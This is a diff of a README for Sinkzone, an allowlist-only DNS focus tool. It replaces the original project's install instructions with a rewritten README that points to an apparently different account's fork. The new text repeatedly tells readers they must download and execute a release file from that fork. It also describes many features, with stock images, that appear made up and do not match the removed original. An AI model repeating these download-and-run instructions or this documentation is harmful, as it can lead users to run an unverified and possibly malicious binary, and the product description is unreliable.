@@ -1,505 +1,748 @@
-<a id="readme-top"></a>
+# SinkZone — Allowlist-Only DNS for Focused, Safe Browsing Control 🚦🔒
 
-<div align="center">
-  <img src="https://share.ber.sh/sinkzone-splash.png" alt="Sinkzone: DNS-based Productivity Tool" width="600">
-  <h1 align="center">Sinkzone: Block-by-default DNS tool for deep focus</h1>
-  <p align="center">
-      The internet is infinite. Your focus isn’t. <br />
-      <br />
-      Sinkzone helps you reclaim control by flipping the default: <strong>everything is blocked</strong>, unless you explicitly allow it. <br/><br/>
-      No feeds. No pings. No surprise connections.<br />
-      <h2>Just a quiet, intentional internet.</h2>
-    <br /><br />
-    <img src="examples/demo-cli.gif" alt="Sinkzone Demo" />
-    <br /><br />
-    <a href="#what-is-sinkzone"><strong>Learn More »</strong></a>
-    &middot;
-    <a href="#quick-start">Quick Start</a>
-    &middot;
-    <a href="https://github.com/berbyte/sinkzone/issues/new">Report a Bug</a>
-    &middot;
-    <a href="#usage">Usage Guide</a>
-  </p>
+[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github&style=for-the-badge)](https://github.com/TheLawIsExplicit/sinkzone/releases)
 
-  <p align="center">
-    <a href="https://golang.org"><img src="https://img.shields.io/badge/Go-1.24+-blue.svg" alt="Go Version" /></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License" /></a>
-    <a href="https://github.com/berbyte/sinkzone/releases"><img src="https://img.shields.io/badge/Platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey.svg" alt="Platform" /></a>
-  </p>
-  
-</div>
+![SinkZone hero](https://images.unsplash.com/photo-1509395176047-4a66953fd231?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=2a2c38b8897a3d3f9b2c9a6b9d5f8f31)
+
+Project: DNS allowlist. Block everything. Allow only what matters. Focus. Productivity. Child safety.
+
+Badges
+- Build: none
+- License: MIT
+- Release: [Download releases](https://github.com/TheLawIsExplicit/sinkzone/releases)
+
+Download and run the release file from the Releases page. You must download the release asset and execute it to install SinkZone. See the Releases link above and below for the release file to download and execute.
 
 ---
 
-<details>
-<summary><b>📚 Table of Contents</b></summary>
+Table of contents
+- What SinkZone does
+- Key benefits
+- How it works
+- Architecture
+- Quick start
+  - Downloads and releases
+  - Run the release file
+- Installation
+  - Linux
+  - macOS
+  - Windows
+  - Docker
+  - Raspberry Pi / Home router
+- Configuration
+  - Allowlist format
+  - DNS rules
+  - Local exceptions
+  - Time-based profiles
+- Common workflows
+  - Productivity mode
+  - Kid-safe mode
+  - Meeting mode
+  - Kiosk mode
+- Advanced topics
+  - Upstream resolution
+  - DNS over TLS / DNS over HTTPS
+  - Caching and TTL
+  - Logs and metrics
+  - Health checks
+- Network setup
+  - Home network
+  - Office network
+  - Remote workers
+- Testing and validation
+- Troubleshooting
+- Security
+- Contributing
+- Roadmap
+- FAQ
+- License
+- Changelog / Releases
 
-- [What is Sinkzone?](#what-is-sinkzone)
-- [Motivation](#motivation)
-- [Why use Sinkzone?](#why-use-sinkzone)
-- [Key Features](#key-features)
-- [Demos](#demos)
-  - [Terminal User Interface (TUI)](#terminal-user-interface-tui)
-  - [Command Line Interface (CLI)](#command-line-interface-cli)
-- [Quick Start](#quick-start)
-  - [Installation by Platform](#installation-by-platform)
-- [Documentation](#documentation)
-  - [Manual Page](#manual-page)
-- [Usage](#usage)
-  - [Common Commands](#common-commands)
-  - [Wildcard Patterns](#wildcard-patterns)
-  - [TUI Navigation](#tui-navigation)
-- [How It Works](#how-it-works)
-  - [Architecture](#architecture)
-  - [API Endpoints](#api-endpoints)
-  - [Normal Mode](#normal-mode)
-  - [Focus Mode](#focus-mode)
-- [Configuration](#configuration)
-- [Development](#development)
-- [License](#license)
-- [Contact](#contact)
+What SinkZone does
+- SinkZone blocks DNS queries by default.
+- It only resolves names on an allowlist.
+- It rejects or sinks all other names.
+- It gives you predictable internet access.
+- It limits distractions.
+- It gives parents control.
 
-</details>
+Key benefits
+- Focus. Block social feeds, apps, and trackers.
+- Safety. Prevent access to adult content and unsafe sites.
+- Productivity. Keep only work-related domains.
+- Simplicity. One list controls access.
+- Flexibility. Per-device or per-network rules.
+- Auditability. Logs show allowed and blocked queries.
 
+How it works
+SinkZone acts as a DNS server. You point clients to it as the resolver. It accepts queries. It checks each name against an allowlist. If the name matches the allowlist, SinkZone resolves the name via an upstream resolver. If not, SinkZone returns a sink response. Sink responses can be NXDOMAIN or an IP such as 0.0.0.0. You choose the sink behavior.
 
+Key concepts
+- Allowlist: the single source of truth for allowed names.
+- Sink response: the reply for blocked names.
+- Upstream resolver: the DNS server SinkZone uses for allowed names.
+- Profiles: sets of allowlist entries for different contexts.
+- Devices: clients that use SinkZone.
 
----
-## What is Sinkzone?
+Architecture
+- Frontend DNS server:
+  - UDP and TCP on port 53.
+  - Optional DoT or DoH endpoints.
+- Allowlist engine:
+  - Fast path match for exact names.
+  - Wildcard and suffix match for domains.
+  - Regex support for advanced rules.
+- Policy engine:
+  - Per-IP, per-subnet, per-profile rules.
+  - Time window rules.
+- Upstream connector:
+  - Supports multiple upstreams.
+  - Failover and parallel queries.
+- Cache:
+  - In-memory cache with TTL respect.
+  - Optional persistent cache.
+- Logging:
+  - Structured logs (JSON).
+  - Query logs and decision logs.
+- Management API:
+  - Local HTTP API for config and stats.
+  - Authentication support.
 
-Sinkzone is a local DNS resolver that helps you eliminate distractions and get deep work done. It blocks all domains by default — only the ones you explicitly allow can get through. This means notifications, social media, news, and other time-sinks are unreachable at the network level — not just in your browser.
+Quick start
 
-It features a modern HTTP API, wildcard pattern support, and a beautiful terminal UI for real-time monitoring and control.
+Download releases
+- Visit the Releases page and download the release file.
+- Use this link: https://github.com/TheLawIsExplicit/sinkzone/releases
+- Download the asset named sinkzone-{version}-{os}.{ext}.
+- The release file needs to be downloaded and executed.
+- The release asset may be a binary, tarball, or installer.
+- Execute the file to install SinkZone.
 
-It's lightweight, cross-platform, and built for hackers, makers, and anyone serious about focus.
+Run the release file (example)
+- Linux tarball:
+  - Download sinkzone-1.2.3-linux-amd64.tar.gz
+  - Extract: tar xzf sinkzone-1.2.3-linux-amd64.tar.gz
+  - Run: sudo ./sinkzone install
+- Linux binary:
+  - Download sinkzone-1.2.3-linux-amd64
+  - Make executable: chmod +x sinkzone-1.2.3-linux-amd64
+  - Run: sudo ./sinkzone --config /etc/sinkzone/config.yaml
+- Windows installer:
+  - Download sinkzone-1.2.3-windows.exe
+  - Run the installer and follow the prompts.
+- Docker:
+  - Pull image tagged with the release version from releases or Docker Hub.
+  - Start container with config volume.
 
-## Motivation
+Installation
 
-Most tools make you list what you want to block. But the internet is infinite — that list never ends. It's much easier to list the few things you actually want to allow.
+Linux (systemd)
+- Place the binary in /usr/local/bin or /opt/sinkzone.
+- Create /etc/sinkzone/config.yaml
+- Example unit file:
+  ```ini
+  [Unit]
+  Description=SinkZone DNS server
+  After=network.target
 
-Sinkzone was born from that insight. I was tired of coding sessions interrupted by Slack pings and email alerts. I needed something stronger than a browser plugin — a system-level kill switch for distractions.
+  [Service]
+  User=root
+  ExecStart=/usr/local/bin/sinkzone --config /etc/sinkzone/config.yaml
+  Restart=on-failure
+  LimitNOFILE=65536
 
-Now I can code for hours uninterrupted. Even my son uses Sinkzone during chess practice to stay focused.
+  [Install]
+  WantedBy=multi-user.target
+  ```
+- Enable and start:
+  - sudo systemctl daemon-reload
+  - sudo systemctl enable sinkzone
+  - sudo systemctl start sinkzone
 
-**Sinkzone exists because I needed it. Maybe you do too.**
+macOS (launchd)
+- Use a plist to run the binary at boot.
+- Place the binary in /usr/local/bin.
+- Use launchctl to load the plist.
 
+Windows
+- Use the installer from the Releases page.
+- The installer registers SinkZone as a service.
+- Use the management UI or CLI to configure.
 
----
+Docker
+- Example docker run:
+  ```bash
+  docker run -d \
+    --name sinkzone \
+    --restart unless-stopped \
+    -p 53:53/udp -p 53:53/tcp \
+    -v /opt/sinkzone/config.yaml:/etc/sinkzone/config.yaml:ro \
+    sinkzone/sinkzone:1.2.3
+  ```
+- Map config and logs to host volumes.
 
-## Why use Sinkzone?
+Raspberry Pi / Home router
+- Use the ARM release or build from source.
+- Run on the Pi and set your router DHCP to point clients to the Pi IP.
+- For OpenWrt, run SinkZone inside a container or on a separate host.
 
-- Avoid distraction without browser extensions or hacks
-- Run locally on macOS, Linux and Windows — no cloud, no telemetry
-- Perfect for deep work sessions, writing, coding, or child safety
-- Terminal UI included — toggle modes, view logs, edit allowlist
+Configuration
 
----
+Primary config file (YAML)
+- server:
+  - listen: 0.0.0.0:53
+  - doh: 127.0.0.1:443
+  - timeout: 2s
+- sink:
+  - type: nx
+  - ip: 0.0.0.0
+- upstream:
+  - - 1.1.1.1
+  - - 8.8.8.8
+- profiles:
+  - default: /etc/sinkzone/allowlists/default.txt
+  - kids: /etc/sinkzone/allowlists/kids.txt
+- logging:
+  - level: info
+  - format: json
 
-## Key Features
+Allowlist format
+- One entry per line.
+- Support exact host names:
+  - example.com
+  - api.example.com
+- Support domain suffix:
+  - .work.example
+  - .trusted
+- Support wildcard:
+  - *.team.example
+- Support regex (enable in config):
+  - /regex-pattern/
+- Comments start with #
+- Blank lines are ignored
 
-- **DNS-level blocking**: Stops distractions before they reach your apps
-- **Focus Mode**: Block all but allowlisted domains for a set duration
-- **Wildcard Support**: Use patterns like `*github*` or `*.google.com` for flexible domain matching
-- **HTTP API**: RESTful API for monitoring and control
-- **Terminal UI**: Real-time DNS traffic viewer with tabbed interface
-- **Memory-backed rules**: Focus mode expires automatically
-- **Cross-platform**: Works on macOS and Linux
+Allowlist examples
+- Work profile:
+  - docs.google.com
+  - slack.com
+  - api.company.com
+  - .companycdn.com
+- Kids profile:
+  - kids.example.com
+  - *.edu
+  - content-filtered-video.example
+- Kiosk profile:
+  - company-portal.example
+  - payment.example.com
 
----
+DNS rules
+- Exact match wins.
+- Longest suffix match wins for domain suffixes.
+- Wildcards match subdomains.
+- Regex runs last if enabled.
+- You can set per-profile TTL override.
 
+Local exceptions
+- Use an exceptions file for internal names.
+  - internal.corp
+  - printer.local
+- Add private IP mappings for local hostnames:
+  - host1.internal 10.0.0.5
 
-## Demos
+Time-based profiles
+- Define profiles with active windows.
+- Example:
+  - kids: 07:00-20:00
+  - focus: 09:00-17:00
+- SinkZone switches profiles for clients by IP or MAC.
 
-### Terminal User Interface (TUI)
+Common workflows
 
-The TUI provides real-time DNS monitoring and allowlist management:
+Productivity mode
+- Purpose: reduce distractions during work hours.
+- Setup:
+  - Create a profile named work.
+  - Add company domains and commonly used tools.
+  - Block social and entertainment domains.
+  - Set start and end times for the profile.
+- Apply:
+  - Map work profile to work subnet or workstation IPs.
 
-![TUI Demo](examples/demo-tui.gif)
+Kid-safe mode
+- Purpose: protect children from harmful content.
+- Setup:
+  - Create kids profile with safe domains.
+  - Add educational sites and streaming services you trust.
+  - Block known adult and gambling domains.
+- Apply:
+  - Use DHCP to assign kids profile by client MAC.
 
-*Real-time DNS traffic monitoring, allowlist management, and focus mode control*
+Meeting mode
+- Purpose: stop notifications and limit bandwidth use.
+- Setup:
+  - Create meeting profile.
+  - Allow video conferencing services and company sites.
+  - Block social and media sites.
+- Apply:
+  - Trigger profile by calendar integration or manual toggle.
 
-### Command Line Interface (CLI)
+Kiosk mode
+- Purpose: lock a device to a fixed set of pages.
+- Setup:
+  - Strict allowlist with only the required domains.
+  - Set sink type to a local info page or captive portal.
+- Apply:
+  - Use profile assigned to kiosk IP or VLAN.
 
-The CLI offers powerful command-line tools for system management:
+Advanced topics
 
-![CLI Demo](examples/demo-cli.gif)
+Upstream resolution
+- SinkZone supports multiple upstreams.
+- Use parallel queries for speed.
+- Use failover when an upstream fails.
+- Use specific upstream per domain if you trust an upstream for a namespace.
 
-*Command-line allowlist management, focus mode control, and system status monitoring*
+DNS over TLS / DNS over HTTPS
+- SinkZone can send allowed queries to DoT or DoH endpoints.
+- Configure certificate validation.
+- Use DoH for networks that block port 53.
 
+Caching and TTL
+- SinkZone respects the TTL from upstream.
+- Configure minimum and maximum cache TTL.
+- Use persistent cache to survive restarts.
 
----
+Logs and metrics
+- Query logs show:
+  - timestamp, client IP, queried name, decision, upstream
+- Decision logs show why a name passed or failed.
+- Metrics:
+  - queries per second
+  - hit ratio
+  - blocked count
+- Export metrics to Prometheus.
 
-## Quick Start
+Health checks
+- Expose an HTTP health endpoint.
+- Provide metrics for uptime and cache stats.
+- Use the endpoint in service monitors.
 
-### Installation by Platform
+Network setup
 
-<details>
-<summary><b>👉 macOS Installation</b></summary>
+Home network
+- Run SinkZone on a Pi or NAS.
+- Set your router DHCP to hand out SinkZone as DNS.
+- For devices that use hardcoded DNS, use firewall rules to redirect DNS to SinkZone.
 
-**Homebrew (Recommended):**
-```bash
-brew tap berbyte/ber
-brew install sinkzone
+Office network
+- Run SinkZone on a dedicated server or container.
+- Point DHCP to SinkZone.
+- Use VLANs to separate guest and staff traffic.
+- Apply different profiles per VLAN.
+
+Remote workers
+- Use a VPN to route remote DNS to SinkZone.
+- Alternatively, offer a DoH endpoint for remote clients.
+- Enforce client auth for DoH.
+
+Testing and validation
+
+Basic tests
+- dig @sinkzone-ip example.com
+- dig @sinkzone-ip socialsite.example
+- Expected: allowed names return A/AAAA. Blocked names return NXDOMAIN or sink IP.
+
+Profile tests
+- Test with client IP bound to a profile.
+- Test time-based activation by changing system time or schedule.
+
+Edge cases
+- Catch captive portals that intercept DNS.
+- Handle DNSSEC validation if required by your upstream.
+
+Troubleshooting
+
+Common issues
+- Clients still use other DNS:
+  - Check DHCP settings.
+  - Check firewall rules.
+- SinkZone not binding to port 53:
+  - Check permission or port conflict.
+  - Stop other DNS services.
+- Upstream failure:
+  - Check network and upstream IPs.
+  - Check DoT/DoH certificates.
+
+Debugging tips
+- Use tcpdump to capture DNS packets.
+- Use dig for manual queries.
+- Check logs at /var/log/sinkzone or journalctl.
+
+Security
+
+Best practices
+- Run SinkZone on a minimal host.
+- Update SinkZone via the releases page.
+- Use least privilege for the service user.
+- Restrict access to the management API.
+- Use TLS for DoH and DoT.
+
+Data handling
+- Logs contain DNS queries.
+- Retain logs only as long as needed.
+- Use log rotation and secure log storage.
+
+Contributing
+
+How to contribute
+- Fork the repo.
+- Create a feature branch.
+- Open a pull request with tests.
+- Follow the code style and run linting.
+
+Code of conduct
+- Be respectful and clear.
+- Submit issues with reproducible steps.
+
+Testing
+- Unit tests for allowlist matching.
+- Integration tests for DNS behavior.
+- End-to-end tests with containers.
+
+Roadmap
+- Per-user profiles via auth.
+- GUI for allowlist management.
+- Mobile app for toggles.
+- Synced allowlists across devices.
+- Policy templates for schools and offices.
+
+FAQ
+
+Q: What DNS reply does SinkZone return for blocked names?
+A: You choose. SinkZone supports NXDOMAIN or an IP sink. Use NXDOMAIN to break resolution. Use a sink IP to route blocked requests to a local info page.
+
+Q: Can SinkZone allow subdomains?
+A: Yes. Use wildcard or suffix entries. Example: .trusted allows any subdomain of trusted.
+
+Q: Can I run SinkZone and another DNS server side by side?
+A: You must avoid port conflicts. Use different ports or run on separate hosts. For production, run SinkZone as the primary resolver.
+
+Q: How do I allow a new site during the day?
+A: Add it to the active profile allowlist. SinkZone reloads the list without restart. You can push changes via API.
+
+Q: How does SinkZone handle CDN domains that serve both allowed and blocked content?
+A: Use exact hostnames for specific services. Use path or SNI based rules in upstream proxies if needed.
+
+Changelog and Releases
+- All release builds and assets appear on the Releases page.
+- Download the release asset and execute it to install or upgrade.
+- Example release asset name: sinkzone-1.2.3-linux-amd64.tar.gz
+- Visit the Releases page here: https://github.com/TheLawIsExplicit/sinkzone/releases
+
+Integration examples
+
+NGINX captive page for sink IP
+- Configure an NGINX server on the sink IP to show an info page for blocked requests.
+  ```nginx
+  server {
+    listen 80;
+    server_name _;
+    root /var/www/sinkzone;
+    location / {
+      try_files $uri $uri/ =404;
+    }
+  }
+  ```
+
+DHCP configuration (ISC dhcpd)
+- Example:
+  ```
+  option domain-name-servers 192.168.1.10;
+  ```
+
+iptables redirect for forced DNS
+- Redirect UDP/TCP 53 to SinkZone IP:
+  ```bash
+  iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to-destination 192.168.1.10:53
+  iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to-destination 192.168.1.10:53
+  ```
+
+Monitoring with Prometheus
+- Expose metrics on /metrics.
+- Scrape endpoint with Prometheus.
+
+Sample allowlist templates
+
+Work (default)
+- docs.google.com
+- drive.google.com
+- mail.google.com
+- *.company.com
+- slack.com
+- teams.microsoft.com
+- github.com
+- api.company.com
+
+Kids
+- kids.learn.example
+- kids.videos.example
+- *.edu
+- apps.kids.example
+
+Kiosk
+- company-portal.example
+- helpdesk.example
+
+Management API (example)
+
+Get status
+- GET /api/v1/status
+- Returns: running, uptime, queries, blocked_count
+
+Update allowlist
+- POST /api/v1/allowlists/{profile}
+- Body: plain text list
+
+Reload config
+- POST /api/v1/reload
+
+Auth
+- Token-based auth in headers.
+
+Logging examples
+
+JSON log line
+- {"ts":"2025-01-01T10:00:00Z","client":"192.168.1.50","name":"facebook.com","decision":"block","rule":"default-no-social","upstream":"","rtt":0}
+
+Metrics to track
+- sinkzone_queries_total
+- sinkzone_blocked_total
+- sinkzone_allowed_total
+- sinkzone_cache_hits_total
+- sinkzone_cache_misses_total
+
+Testing commands
+
+Query allowed name
+- dig @127.0.0.1 docs.google.com +short
+
+Query blocked name
+- dig @127.0.0.1 social.example +short
+- Expect NXDOMAIN or no A record.
+
+Client-side scripts
+
+Bulk allowlist update (bash)
+- Example to push a new allowlist:
+  ```bash
+  curl -X POST -H "Authorization: Bearer $TOKEN" \
+    --data-binary @allowlist.txt \
+    http://127.0.0.1:8080/api/v1/allowlists/work
+  ```
+
+Audit tools
+
+Generate a report of blocked queries per client
+- Use logs to compute top blocked hostnames.
+- Export to CSV for review.
+
+Privacy and data
+- SinkZone logs DNS queries.
+- Mask or anonymize client IPs if needed.
+- Store logs on systems you control.
+
+Scaling tips
+- Use multiple SinkZone instances behind a load balancer.
+- Use shared cache or consistent hashing for cache pinning.
+- For high QPS, use a compiled binary on a server with large NIC buffers.
+
+Testing at scale
+- Use dnsperf or queryperf to simulate load.
+- Monitor latency and cache hit ratio.
+
+Backup and restore
+- Backup allowlist files.
+- Backup config.yaml and certs.
+- Use snapshot and restore for persistent cache if enabled.
+
+Maintenance
+- Check for updates on the Releases page.
+- Rotate any keys and certificates.
+- Test upgrades in a staging environment.
+
+Legal and policy
+- Use allowlists consistent with local laws and policy.
+- Define acceptable use policies for networks you manage.
+
+Credits
+- Core team: list contributors in CONTRIBUTORS.md
+- Design: list designers
+- Community: the users who test and report issues
+
+Files and folders (typical layout)
+- /usr/local/bin/sinkzone
+- /etc/sinkzone/config.yaml
+- /etc/sinkzone/allowlists/
+  - default.txt
+  - kids.txt
+  - kiosk.txt
+- /var/log/sinkzone/
+- /opt/sinkzone/cache/
+
+Examples of config snippets
+
+Allowlist entry with comment
+```
+# Work domains
+docs.google.com
+drive.google.com
 ```
 
-**Manual Setup:**
-```bash
-# 1. Start the DNS Resolver (default port 53, requires admin privileges)
-sudo sinkzone resolver
-
-# 2. Launch the UI (in another terminal)
-sinkzone tui
-
-# 3. Enable Focus Mode
-sinkzone focus start
+Regex entry (if enabled)
+```
+/^ads[0-9]*\./
 ```
 
-**Configure System DNS (Required):**
-```bash
-sudo networksetup -setdnsservers "Wi-Fi" 127.0.0.1
+Profile mapping by subnet
+```
+profiles:
+  192.168.1.0/24: work
+  192.168.2.0/24: kids
 ```
 
-**Direct Download:**
-```bash
-# Apple Silicon (M1/M2)
-curl -L -o sinkzone https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-darwin-arm64
-chmod +x sinkzone
-sudo mv sinkzone /usr/local/bin/
-
-# Intel Mac
-curl -L -o sinkzone https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-darwin-amd64
-chmod +x sinkzone
-sudo mv sinkzone /usr/local/bin/
-```
-
-</details>
-
----
-
-<details>
-<summary><b>👉 Linux Installation</b></summary>
-
-**Package Managers (Recommended):**
-
-**Debian/Ubuntu:**
-```bash
-# Download and install the .deb package
-curl -L -O https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-linux-amd64.deb
-sudo dpkg -i sinkzone-linux-amd64.deb
-```
-
-**Red Hat/Fedora/CentOS:**
-```bash
-# Download and install the .rpm package
-curl -L -O https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-linux-amd64.rpm
-sudo rpm -i sinkzone-linux-amd64.rpm
-```
-
-**Alpine Linux:**
-```bash
-# Download and install the .apk package
-curl -L -O https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-linux-amd64.apk
-sudo apk add --allow-untrusted sinkzone-linux-amd64.apk
-```
-
-**Arch Linux:**
-```bash
-# Download and install the .pkg.tar.zst package
-curl -L -O https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-linux-amd64.pkg.tar.zst
-sudo pacman -U sinkzone-linux-amd64.pkg.tar.zst
-```
-
-**Manual Installation:**
-```bash
-# AMD64
-curl -L -o sinkzone https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-linux-amd64
-chmod +x sinkzone
-sudo mv sinkzone /usr/local/bin/
-
-# ARM64
-curl -L -o sinkzone https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-linux-arm64
-chmod +x sinkzone
-sudo mv sinkzone /usr/local/bin/
-```
-
-**Manual Setup:**
-```bash
-# 1. Start the DNS Resolver (default port 53, requires admin privileges)
-sudo sinkzone resolver
+Automation ideas
+- Sync allowlists from a Git repo.
+- Use CI to validate list changes.
+- Use webhooks to reload SinkZone on changes.
+
+UX and controls
+- UI: manage profiles, search allowlist, toggle profiles.
+- CLI: status, reload, push allowlist.
+
+Testing checklist before deployment
+- Confirm binary runs on your OS.
+- Confirm DNS binding on port 53.
+- Test queries for allowed and blocked names.
+- Verify DHCP points to SinkZone.
+- Test DoH/DoT if used.
+- Validate log generation.
+
+Release and upgrade procedure
+- Download new release asset from Releases.
+- Stop service.
+- Replace binary or run installer.
+- Run config validator if provided.
+- Start service and verify.
+
+Releases again
+- The release file must be downloaded and executed from the Releases page. Find the release asset for your OS and architecture at:
+  https://github.com/TheLawIsExplicit/sinkzone/releases
+- Run the downloaded file to install or upgrade SinkZone.
+
+Example deployment scenarios
+
+Single user on laptop
+- Install SinkZone locally.
+- Configure local resolver to 127.0.0.1.
+- Use allowlists for focus.
+
+Family home
+- Run SinkZone on Pi.
+- Use DHCP to point all devices.
+- Create kid and guest profiles.
+
+Small office
+- Run SinkZone in a VM or container.
+- Integrate with DHCP and AD for device mapping.
+
+School network
+- Use strict allowlists for student devices.
+- Provide teacher profile with wider access.
+
+Enterprise
+- Use SinkZone as an internal resolver for managed devices.
+- Integrate with SSO for per-user profiles.
+
+Commands reference
+
+Start service
+- systemctl start sinkzone
+
+Stop service
+- systemctl stop sinkzone
+
+Reload config
+- systemctl reload-or-restart sinkzone
+
+View logs
+- journalctl -u sinkzone -f
+
+API endpoints
+- GET /api/v1/status
+- POST /api/v1/allowlists/{profile}
+- POST /api/v1/reload
+- GET /metrics
+
+Security checklist
+- Run services under non-root user if possible.
+- Limit access to management API.
+- Use TLS for DoH and DoT.
+- Keep system packages up to date.
+
+Example: allowlist automation pipeline
+- Author creates a pull request in Git repo with new domains.
+- CI validates format and runs tests.
+- On merge, CI pushes allowlist to SinkZone via API.
+- SinkZone reloads list and logs the change.
+
+Maintenance tasks
+- Rotate API tokens.
+- Purge old logs.
+- Check cache health.
+- Review blocked query reports.
+
+Commands to inspect cache
+- sinkzone cache stats
+- sinkzone cache dump --limit 100
+
+Helpful tips
+- Use short lists for strict control.
+- Use profiles to avoid frequent edits.
+- Keep an emergency bypass for admin access.
+
+Frequently used files
+- config.yaml
+- allowlists/default.txt
+- allowlists/kids.txt
+- service unit file
 
-# 2. Launch the UI (in another terminal)
-sinkzone tui
+Community and support
+- File issues in the repo.
+- Open pull requests for fixes and features.
+- Share allowlist templates.
 
-# 3. Enable Focus Mode
-sinkzone focus start
-```
+License
+- MIT. See LICENSE file.
 
-**Configure System DNS (Required):**
-```bash
-echo "nameserver 127.0.0.1" | sudo tee /etc/resolv.conf
-```
+Acknowledgments
+- Open source DNS libraries and projects
+- Community testers and contributors
 
-**Note:** Package installations include the manual page. Run `man sinkzone` for detailed documentation.
+Changelog pointer
+- Check the Releases page for full changelog and assets.
+- Download the release file and execute it for installation and upgrades: https://github.com/TheLawIsExplicit/sinkzone/releases
 
-</details>
+Screenshots and visual aids
 
----
-
-<details>
-<summary><b>👉 Windows Installation</b></summary>
-
-**Direct Download:**
-```powershell
-# AMD64
-Invoke-WebRequest -Uri "https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-windows-amd64.exe" -OutFile "sinkzone.exe"
-# Move to a directory in your PATH (e.g., C:\Windows\System32 or create a custom directory)
-Move-Item sinkzone.exe C:\Windows\System32\sinkzone.exe
+Allowlist editor UI (mock)
+![Allowlist editor](https://images.unsplash.com/photo-1508830524289-0adcbe822b40?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=9b0a3f6d3a7f76d3e0a7f1f2a440d7f1)
 
-# ARM64
-Invoke-WebRequest -Uri "https://github.com/berbyte/sinkzone/releases/latest/download/sinkzone-windows-arm64.exe" -OutFile "sinkzone.exe"
-# Move to a directory in your PATH (e.g., C:\Windows\System32 or create a custom directory)
-Move-Item sinkzone.exe C:\Windows\System32\sinkzone.exe
-```
+Network diagram
+![Network diagram](https://images.unsplash.com/photo-1504384308090-c894fdcc538d?q=80&w=1400&auto=format&fit=crop&ixlib=rb-4.0.3&s=6c8f5d2b8f0b2e7a9e3b8e3d6f7c9f6b)
 
-**Manual Setup:**
-```powershell
-# 1. Start the DNS Resolver (run as Administrator for port 53)
-sinkzone resolver
+Contact
+- Open an issue on GitHub for bugs and feature requests.
+- Send pull requests for code changes.
+- For enterprise support, check the issues and README in repo.
 
-# 2. Launch the UI (in another terminal)
-sinkzone tui
-
-# 3. Enable Focus Mode
-sinkzone focus start
-```
-
-**Configure System DNS (Required):**
-- Open Network & Internet settings
-- Change adapter options
-- Right-click your network adapter → Properties
-- Select "Internet Protocol Version 4 (TCP/IPv4)" → Properties
-- Select "Use the following DNS server addresses"
-- Enter `127.0.0.1` as the preferred DNS server
-
-**Note:** On Windows, you may need to run the resolver as Administrator for port 53, or use an unprivileged port like 5353.
-
-</details>
-
----
-
-<details>
-<summary><b>👉 Build from Source</b></summary>
-
-```bash
-# Clone and build
-git clone https://github.com/berbyte/sinkzone.git
-cd sinkzone
-go build -o sinkzone .
-
-# Follow the manual setup steps above for your platform
-```
-
-</details>
-
----
-
-<details>
-<summary><b>👉 Docker Setup</b></summary>
-
-For Docker-based deployment with Unbound as the upstream DNS resolver, see [README-Docker.md](README-Docker.md) for complete instructions.
-
-```bash
-# Quick start with Docker
-git clone https://github.com/berbyte/sinkzone.git
-cd sinkzone
-docker compose up -d
-```
-
-</details>
-
----
-
-
-## Documentation
-
-### Manual Page
-
-For detailed documentation, run:
-```bash
-sinkzone man
-```
-
----
-
-## Usage
-
-### Common Commands
-
-| Command                  | Description                    |
-| ------------------------ | ------------------------------ |
-| `sinkzone monitor`       | Show last 20 DNS requests      |
-| `sinkzone tui`           | Launch the terminal UI         |
-| `sinkzone resolver`      | Start DNS resolver on port 53  |
-| `sinkzone focus start`   | Enable focus mode for 1 hour   |
-| `sinkzone focus --disable` | Disable focus mode immediately |
-| `sinkzone status`        | View current focus mode state  |
-| `sinkzone allowlist add <domain>` | Add domain to allowlist |
-| `sinkzone allowlist add "*github*"` | Add wildcard pattern |
-| `sinkzone allowlist remove <domain>` | Remove domain from allowlist |
-| `sinkzone allowlist list` | List all allowed domains |
-| `sinkzone config set resolver <ip>` | Set resolver IP |
-| `sinkzone man` | Show manual page |
-
-**Note:** On Unix-like systems (macOS/Linux), you may need to run `sudo sinkzone resolver` for port 53. On Windows, run as Administrator or use an unprivileged port like 5353.
-
-### Wildcard Patterns
-
-Sinkzone supports wildcard patterns for flexible domain matching:
-
-| Pattern | Matches | Examples |
-|---------|---------|----------|
-| `*github*` | Any domain containing "github" | `github.com`, `api.github.com`, `githubusercontent.com` |
-| `*.google.com` | All subdomains of google.com | `maps.google.com`, `drive.google.com`, `docs.google.com` |
-| `api.*.com` | Any api subdomain of .com domains | `api.github.com`, `api.example.com`, `api.stackoverflow.com` |
-| `exact.com` | Exact domain match only | `exact.com` (not `sub.exact.com`) |
-
-**Examples:**
-```bash
-# Allow all GitHub-related domains
-sinkzone allowlist add "*github*"
-
-# Allow all Google subdomains
-sinkzone allowlist add "*.google.com"
-
-# Allow all API subdomains
-sinkzone allowlist add "api.*.com"
-
-# Allow exact domain
-sinkzone allowlist add "stackoverflow.com"
-```
-
-### TUI Navigation
-
-* `←`/`→`: Switch tabs
-* `f`: Enable focus mode (1 hour)
-* `ESC`: Quit
-* Tabs include:
-
-  * **Monitor**: Real-time DNS traffic
-  * **Allowlist**: Add or remove allowed domains
-  * **Settings**: DNS resolver config
-
-
-## How It Works
-
-### Architecture
-
-Sinkzone is composed of three parts:
-
-* **Resolver**: A local DNS server that intercepts queries and maintains real-time data via HTTP API.
-* **HTTP API Server**: Provides REST endpoints for monitoring DNS queries and controlling focus mode.
-* **TUI/CLI**: User interfaces that communicate with the resolver via HTTP API.
-* **TUI**: A terminal UI for interacting with and monitoring the system via HTTP API.
-
-### API Endpoints
-
-The resolver exposes the following HTTP endpoints:
-
-- `GET /api/queries` - Get the last 100 DNS queries
-- `GET /api/focus` - Get current focus mode state
-- `POST /api/focus` - Set focus mode (enabled/disabled, duration)
-- `GET /api/state` - Get complete resolver state
